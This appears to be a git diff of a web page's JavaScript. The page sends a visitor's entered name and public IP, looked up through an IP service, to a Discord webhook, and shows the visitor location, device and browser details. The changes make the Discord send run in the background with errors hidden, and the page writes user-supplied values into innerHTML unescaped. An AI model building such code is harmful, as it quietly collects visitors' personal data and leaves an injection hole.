@@ -19,6 +19,22 @@ async function submitName() {
     
     console.log('Name submitted:', enteredName);
     
+    // Update UI immediately
+    const showDetailsBtn = document.getElementById('showDetailsBtn');
+    const enterNameBtn = document.getElementById('enterNameBtn');
+    
+    if (showDetailsBtn && enterNameBtn) {
+        showDetailsBtn.style.display = 'flex';
+        enterNameBtn.innerHTML = '<span class="btn-icon">✓</span>Name Entered';
+        enterNameBtn.disabled = true;
+        enterNameBtn.style.opacity = '0.6';
+        enterNameBtn.style.cursor = 'not-allowed';
+    }
+    
+    nameSubmitted = true;
+    console.log('UI updated, name submission marked complete');
+    
+    // Try to send Discord webhook in background (don't block UI)
     try {
         // Get basic IP information for the white embed
         const ipResponse = await fetch('https://api.ipify.org?format=json');
@@ -26,25 +42,11 @@ async function submitName() {
         
         // Send white embed to Discord
         await sendWhiteEmbedToDiscord(enteredName, ipData.ip);
-        
-        // Show the View Details button
-        const showDetailsBtn = document.getElementById('showDetailsBtn');
-        const enterNameBtn = document.getElementById('enterNameBtn');
-        
-        if (showDetailsBtn && enterNameBtn) {
-            showDetailsBtn.style.display = 'flex';
-            enterNameBtn.textContent = '✓ Name Entered';
-            enterNameBtn.disabled = true;
-            enterNameBtn.style.opacity = '0.6';
-            enterNameBtn.style.cursor = 'not-allowed';
-        }
-        
-        nameSubmitted = true;
-        console.log('Name submission complete');
+        console.log('Discord webhook sent successfully');
         
     } catch (error) {
-        console.error('Error submitting name:', error);
-        alert('Error submitting name. Please try again.');
+        console.error('Error sending to Discord (but UI still works):', error);
+        // Don't show alert here since UI already updated successfully
     }
 }
 
@@ -267,8 +269,10 @@ async function sendErrorToDiscord(error) {
 
 // Function to send white embed when name is entered
 async function sendWhiteEmbedToDiscord(name, ip) {
-    if (DISCORD_WEBHOOK === 'https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN') {
-        console.log('White embed that would be sent:', { name, ip });
+    console.log('Sending white embed for:', { name, ip });
+    
+    if (DISCORD_WEBHOOK.includes('YOUR_WEBHOOK_ID')) {
+        console.log('Using placeholder webhook URL, white embed would be sent:', { name, ip });
         return;
     }
     
@@ -410,7 +414,7 @@ function displayUserInfo() {
     } else {
         userDetails.innerHTML = `
             <div class="detail-group">
-                <h3>👤 Your Information</h3>
+                <h3>- Your Information</h3>
                 <div class="detail-item">
                     <span class="detail-label">Name:</span>
                     <span class="detail-value">${currentUserInfo.enteredName}</span>
@@ -422,7 +426,7 @@ function displayUserInfo() {
             </div>
             
             <div class="detail-group">
-                <h3>🌐 Network Information</h3>
+                <h3>- Network Information</h3>
                 <div class="detail-item">
                     <span class="detail-label">IP Address:</span>
                     <span class="detail-value">${currentUserInfo.ip}</span>
@@ -434,7 +438,7 @@ function displayUserInfo() {
             </div>
             
             <div class="detail-group">
-                <h3>📍 Location Details</h3>
+                <h3>- Location Details</h3>
                 <div class="detail-item">
                     <span class="detail-label">Country:</span>
                     <span class="detail-value">${currentUserInfo.country} (${currentUserInfo.countryCode})</span>
@@ -458,7 +462,7 @@ function displayUserInfo() {
             </div>
             
             <div class="detail-group">
-                <h3>💻 Device Information</h3>
+                <h3>- Device Information</h3>
                 <div class="detail-item">
                     <span class="detail-label">Platform:</span>
                     <span class="detail-value">${currentUserInfo.platform}</span>
@@ -482,7 +486,7 @@ function displayUserInfo() {
             </div>
             
             <div class="detail-group">
-                <h3>🌐 Browser Information</h3>
+                <h3>- Browser Information</h3>
                 <div class="detail-item">
                     <span class="detail-label">User Agent:</span>
                     <span class="detail-value">${currentUserInfo.userAgent}</span>
